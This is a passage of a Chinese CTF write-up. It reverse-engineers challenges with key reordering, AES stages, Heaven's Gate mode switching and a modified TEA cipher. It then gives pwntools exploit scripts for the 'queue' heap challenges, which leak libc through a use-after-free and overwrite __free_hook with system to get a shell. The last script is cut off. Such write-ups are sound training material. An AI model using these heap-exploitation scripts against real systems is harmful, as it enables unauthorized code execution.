&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>大致逻辑为</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    j=(j+<span class="number">12</span>)^<span class="number">5</span>%<span class="number">39</span></span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">0</span>):</span><br><span class="line">        <span class="built_in">input</span>[i]+=<span class="built_in">input</span>[j]</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> i%<span class="number">3</span>==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">input</span>[i]-=<span class="built_in">input</span>[j]</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">input</span>[i]^=<span class="built_in">input</span>[j]</span><br><span class="line">    i++</span><br></pre></td></tr></table></figure>

<h2 id="order"><a href="#order" class="headerlink" title="order"></a>order</h2><p>输入第一部分flag使key数组恢复顺序</p>
<p>使用push xxx，ret指令进行跳转</p>
<p>依次调用下面顺序的寄存器eax-edx-esi-edi-ecx-ebx</p>
<p><img src="/../images/image1.png" alt="image-20221113090600519"></p>
<p>4016ce这里是获取input1数组的值，最后jmp就是switch</p>
<p><img src="/../images/image2.png" alt="image-20221113090722236"></p>
<p>每个switch会指定一个使用一个寄存器进行跳转（实质上就是花指令）</p>
<p><img src="/../images/image3.png" alt="image-20221113090829587"></p>
<p>switch下的内容进行了换序</p>
<p>整理顺序后的代码：（每个case下是没有break的）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    k=input1[i]%<span class="number">6</span></span><br><span class="line">    switch(k):</span><br><span class="line">    <span class="keyword">case</span>(<span class="number">0</span>):</span><br><span class="line">        exchange(key[<span class="number">1</span>],key[i])</span><br><span class="line">    <span class="keyword">case</span>(<span class="number">2</span>)：</span><br><span class="line">        exchange(key[<span class="number">4</span>],key[i])</span><br><span class="line">    <span class="keyword">case</span>(<span class="number">4</span>):</span><br><span class="line">        exchange(key[<span class="number">7</span>],key[i])</span><br><span class="line">    <span class="keyword">case</span>(<span class="number">5</span>):</span><br><span class="line">        exchange(key[<span class="number">15</span>],key[i])</span><br><span class="line">    <span class="keyword">case</span>(<span class="number">1</span>):</span><br><span class="line">        exchange(key[<span class="number">2</span>],key[i])</span><br><span class="line">    <span class="keyword">case</span>(<span class="number">3</span>):</span><br><span class="line">        exchange(key[<span class="number">6</span>],key[i])</span><br></pre></td></tr></table></figure>

<p>所有调换中，只有 1，4，7，15，2，6六个位置会一直变化</p>
<p>这六个位置的值为’o’, ‘Y’, ‘u’, ‘e’, ‘t’, ‘r’</p>
<p>其余位置逐位爆破即可获得模6的值</p>
<p>题目需要获得有含义的字符串，猜测或计算即可获得</p>
<p>上述指令获得的key会是第二部分AES加密的key</p>
<p>上述输入的第一部分flag是第二部分AES加密的明文</p>
<p>AES加密后的值作为input2的密钥</p>
<p>input2进行AES加密后与恢复顺序的answer数组值相同</p>
<p>具体伪代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AES(input1,key,key2)</span><br><span class="line">AES(input2,key2,out)</span><br><span class="line">out==input2</span><br></pre></td></tr></table></figure>

<p>input2同样会进行类似第一部分的顺序调换（具体内容会有一部分数值和顺序变化，不具体描述）</p>
<p><img src="/../images/image4.png" alt="image-20221113091006293"></p>
<p>第二部分同样有和第一部分一样的代码，但是是存在不唯一解，是误导</p>
<p>必须用AES逆出input2</p>
<p>sub_401170是密钥扩展函数</p>
<p>sub_4013B0是AES加密的函数</p>
<h2 id="Heaven’s-Gate"><a href="#Heaven’s-Gate" class="headerlink" title="Heaven’s Gate"></a>Heaven’s Gate</h2><p>使用天堂之门技术，使程序在32位-64位-32位模式下跳转，来使调试器无法完美调试</p>
<p>第一轮32位下只接收了用户目录下的key</p>
<p>限制了key文件的最后四位（最后四位一旦错误，程序会直接错误）</p>
<p>64位下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">char</span>* key)</span> &#123;</span><br><span class="line">    <span class="type">int</span>* x = (<span class="type">int</span>*)key;</span><br><span class="line">    <span class="type">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">716</span> / <span class="number">4</span>; i++) &#123;</span><br><span class="line">        total ^= x[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">716</span> / <span class="number">4</span>; i++) &#123;</span><br><span class="line">        total ^= x[i];</span><br><span class="line">        x[i] = total;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二部分输入的key与shellcode数组逐位异或</p>
<p>获得第三部分的加密代码</p>
<p>第三部分为魔改tea</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">tea</span><span class="params">(<span class="type">char</span>*a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> x0 = a[<span class="number">0</span>], x1 = a[<span class="number">1</span>], x2 = a[<span class="number">2</span>], x3 = a[<span class="number">3</span>], x4 = a[<span class="number">4</span>], x5 = a[<span class="number">5</span>], sum1 = <span class="number">0</span>, sum2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">7</span>] = &#123; <span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">        sum1 += <span class="number">0x22</span>; sum2 += <span class="number">0x33</span>;</span><br><span class="line">        x0 += ((x1 &lt;&lt; <span class="number">1</span>) ^ (x1 &gt;&gt; <span class="number">4</span>) ^ x1) ^ ((x2 &lt;&lt; <span class="number">2</span>) ^ (x2 &gt;&gt; <span class="number">5</span>) ^ x2) ^ ((x3 &lt;&lt; <span class="number">3</span>) ^ (x3 &gt;&gt; <span class="number">6</span>) ^ x3) ^ ((x4 &lt;&lt; <span class="number">4</span>) ^ (x4 &gt;&gt; <span class="number">7</span>) ^ x4) ^ ((x5 &lt;&lt; <span class="number">5</span>) ^ (x5 &gt;&gt; <span class="number">1</span>) ^ x5) ^ (sum1 + sum2 + key[(sum1 &amp; <span class="number">3</span>) + (sum2 &amp; <span class="number">3</span>)]);</span><br><span class="line">        sum1 += key[<span class="number">0</span>]; sum2 += key[<span class="number">6</span>];</span><br><span class="line">        x1 += ((x2 &lt;&lt; <span class="number">6</span>) ^ (x2 &gt;&gt; <span class="number">2</span>) ^ x2) ^ ((x3 &lt;&lt; <span class="number">7</span>) ^ (x3 &gt;&gt; <span class="number">3</span>) ^ x3) ^ ((x4 &lt;&lt; <span class="number">1</span>) ^ (x4 &gt;&gt; <span class="number">4</span>) ^ x4) ^ ((x5 &lt;&lt; <span class="number">2</span>) ^ (x5 &gt;&gt; <span class="number">5</span>) ^ x5) ^ ((x0 &lt;&lt; <span class="number">3</span>) ^ (x0 &gt;&gt; <span class="number">6</span>) ^ x0) ^ (sum1 + sum2 + key[(sum1 &amp; <span class="number">3</span>) + (sum2 &amp; <span class="number">3</span>)]);</span><br><span class="line">        sum1 += key[<span class="number">1</span>]; sum2 += key[<span class="number">5</span>];</span><br><span class="line">        x2 += ((x3 &lt;&lt; <span class="number">4</span>) ^ (x3 &gt;&gt; <span class="number">7</span>) ^ x3) ^ ((x4 &lt;&lt; <span class="number">5</span>) ^ (x4 &gt;&gt; <span class="number">1</span>) ^ x4) ^ ((x5 &lt;&lt; <span class="number">6</span>) ^ (x5 &gt;&gt; <span class="number">2</span>) ^ x5) ^ ((x0 &lt;&lt; <span class="number">7</span>) ^ (x0 &gt;&gt; <span class="number">3</span>) ^ x0) ^ ((x1 &lt;&lt; <span class="number">1</span>) ^ (x1 &gt;&gt; <span class="number">4</span>) ^ x1) ^ (sum1 + sum2 + key[(sum1 &amp; <span class="number">3</span>) + (sum2 &amp; <span class="number">3</span>)]);</span><br><span class="line">        sum1 += key[<span class="number">2</span>]; sum2 += key[<span class="number">4</span>];</span><br><span class="line">        x3 += ((x4 &lt;&lt; <span class="number">2</span>) ^ (x4 &gt;&gt; <span class="number">5</span>) ^ x4) ^ ((x5 &lt;&lt; <span class="number">3</span>) ^ (x5 &gt;&gt; <span class="number">6</span>) ^ x5) ^ ((x0 &lt;&lt; <span class="number">4</span>) ^ (x0 &gt;&gt; <span class="number">7</span>) ^ x0) ^ ((x1 &lt;&lt; <span class="number">5</span>) ^ (x1 &gt;&gt; <span class="number">1</span>) ^ x1) ^ ((x2 &lt;&lt; <span class="number">6</span>) ^ (x2 &gt;&gt; <span class="number">2</span>) ^ x2) ^ (sum1 + sum2 + key[(sum1 &amp; <span class="number">3</span>) + (sum2 &amp; <span class="number">3</span>)]);</span><br><span class="line">        sum1 += key[<span class="number">3</span>]; sum2 += key[<span class="number">3</span>];</span><br><span class="line">        x4 += ((x5 &lt;&lt; <span class="number">7</span>) ^ (x5 &gt;&gt; <span class="number">3</span>) ^ x5) ^ ((x0 &lt;&lt; <span class="number">1</span>) ^ (x0 &gt;&gt; <span class="number">4</span>) ^ x0) ^ ((x1 &lt;&lt; <span class="number">2</span>) ^ (x1 &gt;&gt; <span class="number">5</span>) ^ x1) ^ ((x2 &lt;&lt; <span class="number">3</span>) ^ (x2 &gt;&gt; <span class="number">6</span>) ^ x2) ^ ((x3 &lt;&lt; <span class="number">4</span>) ^ (x3 &gt;&gt; <span class="number">7</span>) ^ x3) ^ (sum1 + sum2 + key[(sum1 &amp; <span class="number">3</span>) + (sum2 &amp; <span class="number">3</span>)]);</span><br><span class="line">        sum1 += key[<span class="number">4</span>]; sum2 += key[<span class="number">2</span>];</span><br><span class="line">        x5 += ((x0 &lt;&lt; <span class="number">5</span>) ^ (x0 &gt;&gt; <span class="number">1</span>) ^ x0) ^ ((x1 &lt;&lt; <span class="number">6</span>) ^ (x1 &gt;&gt; <span class="number">2</span>) ^ x1) ^ ((x2 &lt;&lt; <span class="number">7</span>) ^ (x2 &gt;&gt; <span class="number">3</span>) ^ x2) ^ ((x3 &lt;&lt; <span class="number">1</span>) ^ (x3 &gt;&gt; <span class="number">4</span>) ^ x3) ^ ((x4 &lt;&lt; <span class="number">2</span>) ^ (x4 &gt;&gt; <span class="number">5</span>) ^ x4) ^ (sum1 + sum2 + key[(sum1 &amp; <span class="number">3</span>) + (sum2 &amp; <span class="number">3</span>)]);</span><br><span class="line">        sum1 += key[<span class="number">5</span>]; sum2 += key[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    a[<span class="number">0</span>] = x0;</span><br><span class="line">    a[<span class="number">1</span>] = x1;</span><br><span class="line">    a[<span class="number">2</span>] = x2;</span><br><span class="line">    a[<span class="number">3</span>] = x3;</span><br><span class="line">    a[<span class="number">4</span>] = x4;</span><br><span class="line">    a[<span class="number">5</span>] = x5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="ezPwn"><a href="#ezPwn" class="headerlink" title="ezPwn"></a>ezPwn</h2><p>签到题，虽然有一个进不去的分支，但是可以直接溢出到那个指令地址。</p>
<h2 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h2><p>整个题目很简单，就是2.31的东西，只要弄懂结构就行</p>
<p>是队列，代码逻辑问题在于我们只在malloc的时候覆盖地址</p>
<p>只要free后能直接show就能泄露基址</p>
<p>然后就是同样的思路UAF就能直接打了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x440</span>))   <span class="comment">#queue1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;qwe&#x27;</span>)  <span class="comment">#enqueue</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x440</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;qwe&#x27;</span>)  <span class="comment">#unsorted</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x440</span>)) <span class="comment">#queue2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;qwe&#x27;</span>)  <span class="comment">#enqueue  2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))  <span class="comment">#dequeue  1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + <span class="number">0x1eee48</span></span><br><span class="line">system = libc_base + <span class="number">0x52290</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  <span class="comment"># dequeue 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sh.sendline(p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="queue2"><a href="#queue2" class="headerlink" title="queue2"></a>queue2</h2><p>一样的东西，就是加了判断</p>
<p>但是除了防护外，加了个malloc的地址判断，所以malloc-1就会导致指针变化但是地址不被覆盖</p>
<p>然后一切和上一题一样了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">32</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x440</span>))   <span class="comment">#queue1</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x440</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;qwe&#x27;</span>)  <span class="comment">#unsorted</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;qwe&#x27;</span>)  <span class="comment">#enqueue</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x440</span>)) <span class="comment">#queue2</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x440</span>)) <span class="comment">#queue3</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;data:&quot;</span>,<span class="string">b&#x27;qwe&#x27;</span>)  <span class="comment">#enqueue  2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))  <span class="comment">#dequeue  1</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;5.show\n&quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;queue:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + <span class="number">0x1eee48</span></span><br><span class="line">system = libc_base + <span class="number">0x52290</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 